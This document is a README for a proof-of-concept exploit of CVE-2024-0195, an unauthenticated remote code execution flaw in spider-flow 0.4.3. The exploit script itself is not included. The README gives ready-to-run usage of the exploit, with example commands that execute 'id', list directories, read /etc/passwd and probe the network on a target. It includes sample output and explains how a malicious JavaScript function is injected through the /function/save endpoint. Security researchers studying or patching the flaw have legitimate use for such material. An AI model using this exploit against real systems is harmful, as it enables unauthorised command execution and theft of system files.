# Spider-Flow 0.4.3 Remote Code Execution POC (CVE-2024-0195)

## Exploit Usage

### Prerequisites
- Python 3.x
- `requests` library (`pip install requests`)
- Target running spider-flow version 0.4.3
- Network access to target

### Installation
```bash
git clone <repository_url>
cd cve/CVE-2024-0195
```

### Basic Usage
```bash
python3 exploit.py -u <target_url> -c <command>
```

### Command-line Options
- `-u, --url`: Target URL (e.g., http://localhost:8088)
- `-c, --command`: Command to execute on target system

### Examples

1. Basic system information:
```bash
# Get user information
python3 exploit.py -u http://localhost:8088 -c "id"

# Expected output:
[*] Sending exploit to http://localhost:8088/function/save
[*] Response status: 200
[*] Execute response: uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo)
```

2. File system access:
```bash
# List directory contents
python3 exploit.py -u http://localhost:8088 -c "ls -la /tmp"

# Read sensitive files
python3 exploit.py -u http://localhost:8088 -c "cat /etc/passwd"
```

3. Network information:
```bash
# Check network configuration
python3 exploit.py -u http://localhost:8088 -c "ifconfig"

# Test connectivity
python3 exploit.py -u http://localhost:8088 -c "ping -c 1 8.8.8.8"
```

### Technical Details

The exploit works by:
1. Creating a malicious JavaScript function via `/function/save` endpoint
2. Using Java's ProcessBuilder for command execution
3. Capturing and base64 encoding the command output
4. Retrieving results via `/function/test` endpoint

### Troubleshooting

1. If command execution fails:
   - Verify target URL is accessible
   - Check if target is running spider-flow 0.4.3
   - Ensure command doesn't contain special characters

2. If no output is received:
   - Try simpler commands first (e.g., "id", "whoami")
   - Check if command produces output to stderr
   - Verify network connectivity to target

### Limitations
- Commands with spaces need proper quoting
- Some special characters may need escaping
- Long-running commands might timeout
- Binary output may not display correctly

## Vulnerability Details

Brief technical summary of CVE-2024-0195:
- Affects spider-flow version 0.4.3
- Remote Code Execution via JavaScript injection
- No authentication required by default
- CVSS Score: 9.8 (Critical)

For full CVE details: [CVE-2024-0195](https://nvd.nist.gov/vuln/detail/CVE-2024-0195)

## Disclaimer
This POC is for security research and testing purposes only. Do not use against unauthorized systems.
